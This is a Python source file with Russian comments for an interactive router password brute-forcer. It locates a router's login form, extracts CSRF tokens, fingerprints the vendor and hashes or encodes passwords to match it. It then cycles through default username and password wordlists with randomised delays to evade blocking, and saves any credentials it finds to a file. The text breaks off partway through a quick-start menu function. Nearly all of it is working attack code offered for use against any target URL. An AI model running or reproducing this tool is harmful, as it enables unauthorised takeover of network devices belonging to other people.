import requests
import time
import sys
import re
import json
import urllib.parse
import hashlib
import random
from typing import Dict, List, Tuple, Optional, Set
from bs4 import BeautifulSoup
import ssl
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

# Отключаем предупреждения о сертификатах
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SSLAdapter(HTTPAdapter):
    """Адаптер для работы с самоподписанными сертификатами"""
    def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        pool_kwargs['ssl_context'] = ctx
        return super().init_poolmanager(connections, maxsize, block, **pool_kwargs)

class RouterAnalyzer:
    """Анализатор роутера - определяет как правильно отправлять запросы"""
    
    def __init__(self, target_url: str):
        self.session = requests.Session()
        self.session.mount('https://', SSLAdapter())
        self.session.mount('http://', HTTPAdapter())
        
        self.target_url = self.normalize_url(target_url)
        self.parsed_url = urllib.parse.urlparse(self.target_url)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        
        # Настройки сессии
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,ru;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # Результаты анализа
        self.login_page_url = None
        self.login_form_data = {}
        self.csrf_tokens = []
        self.cookies_needed = []
        self.request_headers = {}
        self.vendor = None
        self.is_https = self.parsed_url.scheme == 'https'
        self.form_found = False
        
        # Счетчик запросов и блокировок
        self.request_count = 0
        self.blocked = False
    
    def normalize_url(self, url: str) -> str:
        """Нормализация URL"""
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url.rstrip('/')
    
    def make_request(self, url: str, method: str = 'GET', data: dict = None, 
                    allow_redirects: bool = True, timeout: int = 10) -> Optional[requests.Response]:
        """Безопасный запрос с обработкой ошибок и задержкой"""
        if self.blocked or not url:
            return None
        
        # Задержка между запросами
        if self.request_count > 0:
            time.sleep(random.uniform(0.5, 1.5))
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, timeout=timeout, allow_redirects=allow_redirects, verify=False)
            else:
                response = self.session.post(url, data=data, timeout=timeout, 
                                           allow_redirects=allow_redirects, verify=False)
            
            self.request_count += 1
            
            # Проверка на блокировку
            if response.status_code in [403, 429, 503]:
                print(f"[!] Возможная блокировка: статус {response.status_code}")
                self.blocked = True
                return None
            
            # Проверка на капчу
            if any(word in response.text.lower() for word in ['captcha', 'recaptcha', 'robot', 'verification']):
                print("[!] Обнаружена капча!")
                self.blocked = True
                return None
            
            return response
            
        except requests.exceptions.RequestException as e:
            print(f"[!] Ошибка запроса к {url}: {e}")
            return None
    
    def discover_login_page(self) -> bool:
        """Поиск страницы входа"""
        print("\n[1/6] 🔍 Ищем страницу входа...")
        
        # Сначала проверяем основной URL
        response = self.make_request(self.target_url)
        if response and response.status_code == 200:
            if self.is_login_page(response.text):
                self.login_page_url = self.target_url
                print(f"[✓] Страница входа: {self.target_url}")
                return True
        
        # Распространенные пути для входа
        common_paths = [
            '', '/', '/index.html', '/login', '/login.html', '/login.asp',
            '/login.php', '/admin', '/admin/', '/admin/login.asp',
            '/admin/login.php', '/cgi-bin/luci', '/goform/login',
            '/goform/formLogin', '/checkLogin.htm', '/logon.htm',
            '/authentication.html', '/auth.html', '/signin',
            '/userlogin.html', '/userLogin.asp', '/login.cgi',
            '/logincheck', '/LoginCheck', '/login_action.cgi',
            '/cgi-bin/webproc', '/cgi', '/cgi-bin'
        ]
        
        for path in common_paths:
            if path == '':
                test_url = self.base_url
            else:
                test_url = urllib.parse.urljoin(self.base_url, path)
            
            response = self.make_request(test_url)
            if response and response.status_code == 200:
                if self.is_login_page(response.text):
                    self.login_page_url = test_url
                    print(f"[✓] Страница входа: {test_url}")
                    return True
        
        # Если не нашли, используем базовый URL как запасной вариант
        print(f"[⚠] Точная страница входа не найдена, используем: {self.base_url}")
        self.login_page_url = self.base_url
        return True
    
    def is_login_page(self, html: str) -> bool:
        """Определяет, является ли страница страницей входа"""
        if not html:
            return False
            
        html_lower = html.lower()
        
        # Ключевые слова на странице входа
        login_keywords = [
            'password', 'пароль', 'passwort', 'contraseña',
            'login', 'log in', 'sign in', 'вход',
            'username', 'user name', 'логин', 'benutzername',
            'type="password"', 'input.*password',
            'form.*login', 'login.*form'
        ]
        
        # Проверяем наличие полей ввода
        soup = BeautifulSoup(html, 'html.parser')
        password_fields = soup.find_all('input', {'type': 'password'})
        
        # Должен быть хотя бы один парольный input
        has_password_field = len(password_fields) > 0
        
        # Или ключевые слова в тексте
        has_keywords = any(keyword in html_lower for keyword in login_keywords)
        
        return has_password_field or has_keywords
    
    def analyze_login_form(self) -> bool:
        """Анализ формы входа на странице"""
        if not self.login_page_url:
            print("[✗] Нет страницы входа для анализа")
            return False
        
        print("\n[2/6] 📋 Анализируем форму входа...")
        
        response = self.make_request(self.login_page_url)
        if not response:
            print("[✗] Не удалось получить страницу")
            return False
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Ищем все формы
        forms = soup.find_all('form')
        if not forms:
            print("[⚠] Формы не найдены, пробуем найти input поля напрямую")
            return self.find_input_fields_directly(soup)
        
        print(f"[+] Найдено форм: {len(forms)}")
        
        for i, form in enumerate(forms):
            print(f"\n  Форма #{i+1}:")
            
            # URL отправки формы
            action = form.get('action', '')
            if action:
                form_url = urllib.parse.urljoin(self.login_page_url, action)
            else:
                form_url = self.login_page_url
            
            print(f"    URL отправки: {form_url}")
            
            # Метод отправки
            method = form.get('method', 'get').upper()
            print(f"    Метод: {method}")
            
            # Ищем все input поля
            inputs = form.find_all('input')
            print(f"    Поля ввода: {len(inputs)}")
            
            form_data = {}
            username_field = None
            password_field = None
            
            for inp in inputs:
                name = inp.get('name', '')
                input_type = inp.get('type', 'text').lower()
                value = inp.get('value', '')
                
                if name:
                    print(f"      - {name} (type={input_type}, value='{value[:30]}...')")
                    form_data[name] = value
                    
                    # Определяем поля логина и пароля
                    if input_type == 'password':
                        password_field = name
                    elif any(keyword in name.lower() for keyword in ['user', 'login', 'name', 'account']):
                        if not username_field:
                            username_field = name
                    elif input_type == 'text' and not username_field:
                        username_field = name
            
            # Если нашли форму с паролем, сохраняем ее
            if password_field:
                self.login_form_data = {
                    'url': form_url,
                    'method': method,
                    'fields': form_data,
                    'username_field': username_field or 'username',
                    'password_field': password_field
                }
                self.form_found = True
                
                print(f"\n[✓] Найдена форма входа!")
                print(f"    Поле логина: {self.login_form_data['username_field']}")
                print(f"    Поле пароля: {self.login_form_data['password_field']}")
                print(f"    Всего полей: {len(form_data)}")
                return True
        
        print("[⚠] Не найдена форма с полем пароля, пробуем альтернативный поиск")
        return self.find_input_fields_directly(soup)
    
    def find_input_fields_directly(self, soup) -> bool:
        """Ищет поля ввода напрямую, если форма не найдена"""
        print("[+] Ищем поля ввода напрямую...")
        
        # Ищем все поля password
        password_fields = soup.find_all('input', {'type': 'password'})
        if not password_fields:
            print("[✗] Не найдены поля пароля")
            return False
        
        print(f"[+] Найдено полей пароля: {len(password_fields)}")
        
        # Берем первое поле пароля
        password_field = password_fields[0]
        password_name = password_field.get('name', 'password')
        
        # Ищем соответствующее поле для логина
        username_field = None
        text_fields = soup.find_all('input', {'type': 'text'})
        
        for field in text_fields:
            field_name = field.get('name', '').lower()
            if any(keyword in field_name for keyword in ['user', 'login', 'name', 'account']):
                username_field = field.get('name', 'username')
                break
        
        if not username_field and text_fields:
            username_field = text_fields[0].get('name', 'username')
        
        # Пробуем найти форму или определить URL
        parent_form = password_field.find_parent('form')
        if parent_form:
            action = parent_form.get('action', '')
            form_url = urllib.parse.urljoin(self.login_page_url, action) if action else self.login_page_url
            method = parent_form.get('method', 'POST').upper()
        else:
            # Если нет формы, пробуем стандартные URL для входа
            form_url = self.login_page_url
            method = 'POST'
        
        # Собираем все input поля на странице
        all_inputs = soup.find_all('input')
        form_data = {}
        for inp in all_inputs:
            name = inp.get('name')
            if name:
                form_data[name] = inp.get('value', '')
        
        self.login_form_data = {
            'url': form_url,
            'method': method,
            'fields': form_data,
            'username_field': username_field or 'username',
            'password_field': password_name
        }
        self.form_found = True
        
        print(f"[✓] Найдены поля входа (альтернативный поиск):")
        print(f"    Поле логина: {self.login_form_data['username_field']}")
        print(f"    Поле пароля: {self.login_form_data['password_field']}")
        print(f"    URL: {form_url}")
        
        return True
    
    def find_csrf_tokens(self) -> None:
        """Поиск CSRF токенов"""
        print("\n[3/6] 🔐 Ищем токены безопасности...")
        
        if not self.login_page_url:
            print("[✗] Нет страницы для поиска токенов")
            return
        
        response = self.make_request(self.login_page_url)
        if not response:
            return
        
        html = response.text
        
        # Поиск CSRF токенов в разных форматах
        patterns = [
            r'name=["\']csrf["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']authenticity_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
            r'csrf["\']?:\s*["\']([^"\']+)["\']',
            r'_token["\']?:\s*["\']([^"\']+)["\']',
            r'"csrfToken":"([^"]+)"',
            r'csrfmiddlewaretoken["\'][^>]*value=["\']([^"\']+)["\']'
        ]
        
        found_tokens = []
        for pattern in patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            found_tokens.extend(matches)
        
        if found_tokens:
            self.csrf_tokens = list(set(found_tokens))
            print(f"[✓] Найдено CSRF токенов: {len(self.csrf_tokens)}")
            for token in self.csrf_tokens[:3]:  # Показываем первые 3
                print(f"    Токен: {token[:50]}...")
        else:
            print("[✓] CSRF токены не найдены (может быть нормально)")
    
    def detect_vendor(self) -> None:
        """Определение производителя роутера"""
        print("\n[4/6] 🏷️ Определяем производителя...")
        
        test_urls = [self.base_url, self.login_page_url] if self.login_page_url else [self.base_url]
        
        for url in test_urls:
            response = self.make_request(url)
            if response and response.status_code == 200:
                html = response.text.lower()
                
                vendor_indicators = {
                    'tp-link': ['tp-link', 'tplink', 'tp link', 'tp.link'],
                    'd-link': ['d-link', 'dlink', 'd link'],
                    'asus': ['asus', 'asuswrt'],
                    'netgear': ['netgear'],
                    'huawei': ['huawei', 'hilink'],
                    'zyxel': ['zyxel'],
                    'cisco': ['cisco', 'linksys'],
                    'mikrotik': ['mikrotik', 'routeros'],
                    'ubiquiti': ['ubiquiti', 'ubnt'],
                    'tenda': ['tenda'],
                    'xiongmao': ['xiongmao', 'panda'],
                    'totolink': ['totolink'],
                    'merc': ['mercury', 'merc'],
                    'fast': ['fast'],
                    'tplink': ['tplink'],
                    'draytek': ['draytek'],
                    'zywal': ['zywal', 'zyxel'],
                    'arris': ['arris'],
                    'sagemcom': ['sagemcom', 'sagem'],
                    'technicolor': ['technicolor'],
                    'sercomm': ['sercomm']
                }
                
                for vendor, indicators in vendor_indicators.items():
                    for indicator in indicators:
                        if indicator in html:
                            self.vendor = vendor
                            print(f"[✓] Производитель: {vendor}")
                            return
                
                # Пробуем по заголовкам
                try:
                    server_header = response.headers.get('Server', '').lower()
                    for vendor, indicators in vendor_indicators.items():
                        for indicator in indicators:
                            if indicator in server_header:
                                self.vendor = vendor
                                print(f"[✓] Производитель (по заголовку): {vendor}")
                                return
                except:
                    pass
        
        print("[?] Производитель не определен")
    
    def get_login_requirements(self) -> Dict:
        """Получаем все требования для входа"""
        print("\n[5/6] 📊 Собираем требования для входа...")
        
        # Базовые значения по умолчанию
        requirements = {
            'login_url': self.base_url,  # Всегда есть base_url
            'method': 'POST',
            'username_field': 'username',
            'password_field': 'password',
            'additional_fields': {},
            'csrf_tokens': self.csrf_tokens,
            'vendor': self.vendor,
            'needs_initial_request': True,
            'needs_csrf': len(self.csrf_tokens) > 0,
            'form_found': self.form_found
        }
        
        # Если нашли форму, используем её данные
        if self.login_form_data:
            requirements.update({
                'login_url': self.login_form_data.get('url', self.base_url),
                'method': self.login_form_data.get('method', 'POST'),
                'username_field': self.login_form_data.get('username_field', 'username'),
                'password_field': self.login_form_data.get('password_field', 'password'),
                'additional_fields': self.login_form_data.get('fields', {})
            })
        
        # Убедимся, что login_url не None
        if not requirements['login_url']:
            requirements['login_url'] = self.base_url
        
        # Определяем возможные преобразования пароля
        if self.vendor:
            requirements['password_transform'] = self.get_password_transform(self.vendor)
        else:
            requirements['password_transform'] = 'none'
        
        print(f"[✓] Требования собраны:")
        print(f"    URL: {requirements['login_url']}")
        print(f"    Метод: {requirements['method']}")
        print(f"    Поле логина: {requirements['username_field']}")
        print(f"    Поле пароля: {requirements['password_field']}")
        print(f"    Доп. полей: {len(requirements['additional_fields'])}")
        print(f"    CSRF: {'да' if requirements['needs_csrf'] else 'нет'}")
        print(f"    Преобразование пароля: {requirements['password_transform']}")
        print(f"    Форма найдена: {'да' if requirements['form_found'] else 'нет'}")
        
        return requirements
    
    def get_password_transform(self, vendor: str) -> str:
        """Определяет преобразование пароля для производителя"""
        transforms = {
            'tp-link': 'base64',
            'd-link': 'md5',
            'asus': 'md5',
            'netgear': 'none',
            'huawei': 'md5',
            'zyxel': 'none',
            'cisco': 'md5',
            'mikrotik': 'none',
            'ubiquiti': 'none',
            'tenda': 'base64'
        }
        return transforms.get(vendor, 'none')
    
    def analyze(self) -> Optional[Dict]:
        """Полный анализ роутера"""
        print("\n" + "="*70)
        print("🔬 ПОЛНЫЙ АНАЛИЗ РОУТЕРА")
        print("="*70)
        
        steps = [
            ("Поиск страницы входа", self.discover_login_page),
            ("Анализ формы входа", self.analyze_login_form),
            ("Поиск токенов безопасности", self.find_csrf_tokens),
            ("Определение производителя", self.detect_vendor)
        ]
        
        for step_name, step_func in steps:
            print(f"\n{step_name}...")
            try:
                result = step_func()
                if step_name == "Анализ формы входа" and not result:
                    print(f"[⚠] {step_name} не удался, используем базовые значения")
            except Exception as e:
                print(f"[!] Ошибка в {step_name}: {e}")
                if step_name == "Поиск страницы входа":
                    print("[⚠] Используем базовый URL")
                    self.login_page_url = self.base_url
        
        requirements = self.get_login_requirements()
        
        print("\n" + "="*70)
        print("[✓] АНАЛИЗ ЗАВЕРШЕН")
        print("="*70)
        
        return requirements

class SmartRouterBruteForcer:
    """Умный брутфорсер с анализом"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.analyzer = RouterAnalyzer(target_url)
        self.requirements = None
        self.session = requests.Session()
        self.session.mount('https://', SSLAdapter())
        
        # Статистика
        self.attempts = 0
        self.successful = 0
        self.blocked = False
        self.start_time = time.time()
        self.found_credentials = None
        
        # Задержки
        self.min_delay = 1.0
        self.max_delay = 3.0
    
    def transform_password(self, password: str, transform_type: str) -> str:
        """Преобразование пароля"""
        if transform_type == 'md5':
            return hashlib.md5(password.encode()).hexdigest()
        elif transform_type == 'base64':
            import base64
            return base64.b64encode(password.encode()).decode()
        elif transform_type == 'sha1':
            return hashlib.sha1(password.encode()).hexdigest()
        elif transform_type == 'sha256':
            return hashlib.sha256(password.encode()).hexdigest()
        else:
            return password
    
    def prepare_login_data(self, username: str, password: str, 
                          use_csrf: bool = True) -> Dict:
        """Подготовка данных для входа"""
        if not self.requirements:
            return {'username': username, 'password': password}
        
        data = self.requirements['additional_fields'].copy()
        
        # Добавляем логин и пароль
        username_field = self.requirements.get('username_field', 'username')
        password_field = self.requirements.get('password_field', 'password')
        
        # Преобразуем пароль если нужно
        password_processed = self.transform_password(
            password, 
            self.requirements.get('password_transform', 'none')
        )
        
        data[username_field] = username
        data[password_field] = password_processed
        
        # Добавляем CSRF токен если есть
        if use_csrf and self.requirements.get('csrf_tokens'):
            # Ищем поле для CSRF в форме
            for key in data.keys():
                if any(csrf_word in key.lower() for csrf_word in ['csrf', 'token', '_token']):
                    if self.requirements['csrf_tokens']:
                        data[key] = self.requirements['csrf_tokens'][0]
                    break
        
        return data
    
    def get_login_url(self) -> str:
        """Безопасно получает URL для входа"""
        if not self.requirements:
            return self.analyzer.base_url
        
        url = self.requirements.get('login_url')
        if not url:
            url = self.analyzer.base_url
        
        # Убедимся, что URL валидный
        try:
            urllib.parse.urlparse(url)
            return url
        except:
            return self.analyzer.base_url
    
    def make_login_request(self, username: str, password: str) -> Optional[requests.Response]:
        """Выполняет запрос на вход"""
        if self.blocked:
            return None
        
        # Задержка для избежания блокировки
        time.sleep(random.uniform(self.min_delay, self.max_delay))
        
        if not self.requirements:
            print("[!] Требования не определены, используем базовый подход")
            return self.make_basic_login_request(username, password)
        
        # Получаем URL для входа
        login_url = self.get_login_url()
        if not login_url:
            print("[!] Не удалось определить URL для входа")
            return None
        
        # Подготавливаем данные
        data = self.prepare_login_data(username, password)
        method = self.requirements.get('method', 'POST')
        
        # Сначала делаем GET запрос для получения свежих кук/токенов если нужно
        if self.requirements.get('needs_initial_request', True):
            self.analyzer.make_request(login_url, 'GET')
        
        # Выполняем запрос на вход
        try:
            if method == 'GET':
                # Для GET добавляем параметры в URL
                params = '&'.join([f"{k}={urllib.parse.quote(str(v))}" for k, v in data.items()])
                full_url = f"{login_url}?{params}" if '?' not in login_url else f"{login_url}&{params}"
                response = self.session.get(full_url, timeout=10, verify=False, allow_redirects=True)
            else:
                response = self.session.post(login_url, data=data, timeout=10, verify=False, allow_redirects=True)
            
            self.attempts += 1
            
            # Проверяем блокировку
            if response.status_code in [403, 429, 503]:
                print(f"[!] Блокировка! Статус: {response.status_code}")
                self.blocked = True
                return None
            
            return response
            
        except Exception as e:
            print(f"[!] Ошибка запроса к {login_url}: {e}")
            return None
    
    def make_basic_login_request(self, username: str, password: str) -> Optional[requests.Response]:
        """Базовый запрос на вход (если анализ не удался)"""
        # Стандартные URL для входа
        login_urls = [
            self.analyzer.base_url,
            urllib.parse.urljoin(self.analyzer.base_url, '/login'),
            urllib.parse.urljoin(self.analyzer.base_url, '/admin'),
            urllib.parse.urljoin(self.analyzer.base_url, '/authenticate'),
            urllib.parse.urljoin(self.analyzer.base_url, '/cgi-bin/luci')
        ]
        
        for url in login_urls:
            try:
                data = {'username': username, 'password': password}
                response = self.session.post(url, data=data, timeout=10, verify=False, allow_redirects=True)
                self.attempts += 1
                
                if response.status_code not in [403, 429, 503]:
                    return response
            except:
                continue
        
        return None
    
    def check_login_success(self, response: requests.Response, username: str, password: str) -> bool:
        """Проверяет успешность входа"""
        if not response:
            return False
        
        html = response.text.lower()
        url = response.url.lower()
        
        # Признаки НЕУДАЧНОГО входа
        failure_indicators = [
            'invalid', 'incorrect', 'wrong', 'error',
            'failed', 'failure', 'login failed',
            'неверный', 'ошибка', 'неправильный',
            'username or password', 'user name or password',
            'try again', 'please try again',
            'access denied', 'denied'
        ]
        
        for indicator in failure_indicators:
            if indicator in html:
                return False
        
        # Признаки УСПЕШНОГО входа
        success_indicators = [
            'dashboard', 'main', 'home', 'welcome',
            'status', 'config', 'settings',
            'wireless', 'network', 'security',
            'logout', 'log out', 'sign out',
            'admin', 'management', 'control',
            'панель', 'управление', 'статус'
        ]
        
        success_count = 0
        for indicator in success_indicators:
            if indicator in html:
                success_count += 1
        
        # Проверяем редирект (часто при успешном входе)
        redirected = response.history and len(response.history) > 0
        
        # Комбинированная проверка
        success_score = 0
        
        if success_count >= 2:
            success_score += 2
        
        if redirected:
            success_score += 1
            
        if 'logout' in html or 'log out' in html:
            success_score += 2
        
        return success_score >= 3
    
    def brute_with_analysis(self, username_list: List[str], password_list: List[str]) -> Optional[Tuple[str, str]]:
        """Основной метод подбора с анализом"""
        print("\n" + "="*70)
        print("🎯 НАЧИНАЕМ УМНЫЙ ПОДБОР")
        print("="*70)
        
        # Сначала анализируем роутер
        print("\n🔬 АНАЛИЗИРУЕМ РОУТЕР...")
        self.requirements = self.analyzer.analyze()
        
        if not self.requirements:
            print("[⚠] Не удалось проанализировать роутер, используем базовый подход")
            self.requirements = {
                'login_url': self.analyzer.base_url,
                'method': 'POST',
                'username_field': 'username',
                'password_field': 'password',
                'additional_fields': {},
                'csrf_tokens': [],
                'needs_initial_request': True,
                'needs_csrf': False,
                'password_transform': 'none'
            }
        
        print(f"\n🎯 ЦЕЛЬ: {self.target_url}")
        print(f"👤 Логинов для проверки: {len(username_list)}")
        print(f"🔑 Паролей для проверки: {len(password_list)}")
        print(f"🔢 Всего комбинаций: {len(username_list) * len(password_list)}")
        print(f"⏱️  Задержка: {self.min_delay}-{self.max_delay} сек между попытками")
        print("="*70)
        
        total = len(username_list) * len(password_list)
        current = 0
        
        # Сначала проверяем самые частые комбинации
        print("\n🚀 Проверяем частые комбинации...")
        common_combinations = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', ''),
            ('Admin', 'Admin'),
            ('root', 'admin'),
            ('user', 'user'),
            ('admin', 'admin123'),
            ('administrator', 'password')
        ]
        
        for username, password in common_combinations:
            if username in username_list and password in password_list:
                current += 1
                print(f"\r[{current}/{total}] Пробуем: {username}:{password}", end="")
                
                response = self.make_login_request(username, password)
                if response and self.check_login_success(response, username, password):
                    self.found_credentials = (username, password)
                    self.show_success(username, password)
                    return username, password
        
        # Полный перебор
        print("\n\n🔍 Начинаем полный перебор...")
        for username in username_list:
            for password in password_list:
                if self.blocked:
                    print("\n[!] Обнаружена блокировка! Останавливаемся.")
                    return None
                
                current += 1
                if current % 5 == 0:  # Реже обновляем прогресс
                    percent = (current / total) * 100
                    print(f"\r[{current}/{total}] {percent:.1f}%", end="")
                
                response = self.make_login_request(username, password)
                if response and self.check_login_success(response, username, password):
                    self.found_credentials = (username, password)
                    self.show_success(username, password)
                    return username, password
        
        print(f"\n\n[✗] Подбор завершен. Учетные данные не найдены.")
        return None
    
    def show_success(self, username: str, password: str):
        """Показывает успешный результат"""
        elapsed = time.time() - self.start_time
        speed = self.attempts / elapsed if elapsed > 0 else 0
        
        print(f"\n\n{'='*70}")
        print("🎉 УСПЕХ! УЧЕТНЫЕ ДАННЫЕ НАЙДЕНЫ!")
        print(f"{'='*70}")
        print(f"🌐 URL: {self.target_url}")
        print(f"👤 Логин: {username}")
        print(f"🔑 Пароль: {password}")
        print(f"📊 Найдено за {self.attempts} попыток")
        print(f"⏱️  Время: {elapsed:.1f} сек")
        print(f"⚡ Скорость: {speed:.1f} попыток/сек")
        print(f"{'='*70}")
        
        # Сохраняем результат
        self.save_result(username, password)
    
    def save_result(self, username: str, password: str):
        """Сохраняет результат в файл"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        with open("found_credentials.txt", "a", encoding="utf-8") as f:
            f.write(f"{timestamp} | {self.target_url} | {username}:{password}\n")
        print(f"[💾] Результат сохранен в found_credentials.txt")
    
    def get_stats(self) -> Dict:
        """Возвращает статистику"""
        elapsed = time.time() - self.start_time
        return {
            'attempts': self.attempts,
            'successful': 1 if self.found_credentials else 0,
            'time': elapsed,
            'speed': self.attempts / elapsed if elapsed > 0 else 0,
            'blocked': self.blocked,
            'found': self.found_credentials
        }

# ==================== ФУНКЦИИ ЗАГРУЗКИ ФАЙЛОВ ====================

def load_wordlist(filename: str) -> List[str]:
    """
    Загружает список из файла, где каждый элемент на новой строке
    
    Пример файла passwords.txt:
    admin
    password
    123456
    admin123
    qwerty
    """
    try:
        print(f"\n[📁] Загружаю файл: {filename}")
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            items = []
            lines_loaded = 0
            
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                
                # Пропускаем пустые строки и комментарии
                if not line or line.startswith('#'):
                    continue
                
                # Если строка содержит запятые, разделяем
                if ',' in line:
                    parts = [part.strip() for part in line.split(',') if part.strip()]
                    items.extend(parts)
                    lines_loaded += len(parts)
                else:
                    items.append(line)
                    lines_loaded += 1
                
                # Прогресс для больших файлов
                if line_num % 1000 == 0:
                    print(f"    Загружено строк: {line_num}")
            
            # Удаляем дубликаты
            unique_items = list(set(items))
            duplicates_removed = len(items) - len(unique_items)
            
            print(f"[✓] Файл загружен успешно!")
            print(f"    Всего строк в файле: {line_num}")
            print(f"    Загружено паролей: {lines_loaded}")
            print(f"    Уникальных паролей: {len(unique_items)}")
            if duplicates_removed > 0:
                print(f"    Удалено дубликатов: {duplicates_removed}")
            
            return unique_items
            
    except FileNotFoundError:
        print(f"[✗] Файл не найден: {filename}")
        return []
    except PermissionError:
        print(f"[✗] Нет доступа к файлу: {filename}")
        return []
    except Exception as e:
        print(f"[✗] Ошибка загрузки файла {filename}: {e}")
        return []

def load_usernames_file(filename: str) -> List[str]:
    """Специальная функция для загрузки файла с логинами"""
    usernames = load_wordlist(filename)
    
    # Добавляем вариации для каждого логина
    enhanced_usernames = set(usernames)
    
    for username in usernames:
        # Добавляем варианты регистра
        enhanced_usernames.add(username.lower())
        enhanced_usernames.add(username.upper())
        enhanced_usernames.add(username.capitalize())
        
        # Добавляем числовые суффиксы
        for i in range(1, 6):
            enhanced_usernames.add(f"{username}{i}")
            enhanced_usernames.add(f"{username}_{i}")
    
    result = list(enhanced_usernames)
    print(f"[+] Логинов с вариациями: {len(result)}")
    
    return result

def create_example_password_file():
    """Создает пример файла с паролями"""
    print("\n[+] Создаю пример файла с паролями (passwords.txt)...")
    
    common_passwords = [
        "# Самые частые пароли для роутеров",
        "# Каждый пароль на отдельной строке",
        "",
        "admin",
        "Admin",
        "ADMIN",
        "password",
        "Password",
        "PASSWORD",
        "123456",
        "12345678",
        "123456789",
        "1234",
        "12345",
        "",
        "# Пустой пароль (оставьте строку пустой)",
        "",
        "admin123",
        "admin1234",
        "password123",
        "pass123",
        "root",
        "Root",
        "ROOT",
        "default",
        "Default",
        "DEFAULT",
        "user",
        "User",
        "USER",
        "guest",
        "Guest",
        "GUEST",
        "welcome",
        "Welcome",
        "WELCOME",
        "letmein",
        "LetMeIn",
        "qwerty",
        "QWERTY",
        "abc123",
        "ABC123",
        "pass",
        "Pass",
        "",
        "# Производители",
        "cisco",
        "Cisco",
        "CISCO",
        "huawei",
        "Huawei",
        "HUAWEI",
        "zyxel",
        "Zyxel",
        "ZYXEL",
        "netgear",
        "Netgear",
        "NETGEAR",
        "tplink",
        "TPLink",
        "TPLINK",
        "dlink",
        "DLink",
        "DLINK",
        "ubnt",
        "Ubnt",
        "UBNT",
        "mikrotik",
        "Mikrotik",
        "MIKROTIK"
    ]
    
    try:
        with open("passwords.txt", "w", encoding="utf-8") as f:
            for password in common_passwords:
                f.write(password + "\n")
        
        print("[✓] Файл passwords.txt создан!")
        print("    Всего паролей: 60+")
        print("\n[📝] Формат файла:")
        print("    - Каждый пароль на отдельной строке")
        print("    - Пустые строки пропускаются")
        print("    - Строки с # - комментарии")
        print("    - Для пустого пароля оставьте пустую строку")
        
    except Exception as e:
        print(f"[✗] Ошибка создания файла: {e}")

def create_example_username_file():
    """Создает пример файла с логинами"""
    print("\n[+] Создаю пример файла с логинами (usernames.txt)...")
    
    common_usernames = [
        "# Частые логины для роутеров",
        "# Каждый логин на отдельной строке",
        "",
        "admin",
        "Admin",
        "ADMIN",
        "administrator",
        "Administrator",
        "ADMINISTRATOR",
        "root",
        "Root",
        "ROOT",
        "user",
        "User",
        "USER",
        "guest",
        "Guest",
        "GUEST",
        "support",
        "Support",
        "SUPPORT",
        "default",
        "Default",
        "DEFAULT",
        "admin1",
        "admin2",
        "admin3",
        "superuser",
        "sysadmin",
        "operator",
        "manager",
        "mgr",
        "test",
        "telnet",
        "ftp",
        "http",
        "www",
        "web",
        "system",
        "System",
        "SYSTEM"
    ]
    
    try:
        with open("usernames.txt", "w", encoding="utf-8") as f:
            for username in common_usernames:
                f.write(username + "\n")
        
        print("[✓] Файл usernames.txt создан!")
        print("    Всего логинов: 40+")
        
    except Exception as e:
        print(f"[✗] Ошибка создания файла: {e}")

# ==================== ИНТЕРАКТИВНЫЙ ИНТЕРФЕЙС ====================

def interactive_mode():
    """Полный интерактивный режим с меню"""
    print("""
    ╔══════════════════════════════════════════════╗
    ║      УМНЫЙ ПОДБОР ПАРОЛЕЙ РОУТЕРА           ║
    ║        с загрузкой файлов паролей           ║
    ╚══════════════════════════════════════════════╝
    """)
    
    while True:
        print("\n" + "="*70)
        print("ГЛАВНОЕ МЕНЮ")
        print("="*70)
        print("1. 🚀 Быстрый старт (частые пароли)")
        print("2. 📁 Загрузить пароли из файла")
        print("3. 🔧 Расширенный режим (логины + пароли из файлов)")
        print("4. 🛠️  Создать примеры файлов")
        print("5. 📊 Только анализ (без подбора)")
        print("6. ❌ Выход")
        print("="*70)
        
        choice = input("\nВыберите действие (1-6): ").strip()
        
        if choice == "1":
            quick_start_mode()
        elif choice == "2":
            file_password_mode()
        elif choice == "3":
            advanced_mode()
        elif choice == "4":
            create_example_files()
        elif choice == "5":
            analysis_only_mode()
        elif choice == "6":
            print("\n[👋] Выход...")
            break
        else:
            print("[!] Неверный выбор, попробуйте снова")

def quick_start_mode():
    """Режим быстрого старта с частыми паролями"""
    print("\n" + "="*70)
    print("🚀 РЕЖИМ БЫСТРОГО СТАРТА")
    print("="*70)
    
    # Ввод URL
    url = input("\nВведите URL роутера (или Enter для 192.168.1.1): ").strip()
    if not url:
        url = "http://192.168.1.1"
    
    # Стандартные логины
    usernames = ['admin', 'Admin', 'root', 'user', 'administrator']
    
    # Стандартные пароли
    passwords = [
        'admin', 'Admin', 'ADMIN', 'password', 'Password', 'PASSWORD',
        '123456', '12345678', '123456789', '1234', '12345',
        '', 'admin123', 'admin1234', 'password123', 'pass123',
        'root', 'Root', 'ROOT', 'default', 'Default', 'DEFAULT',
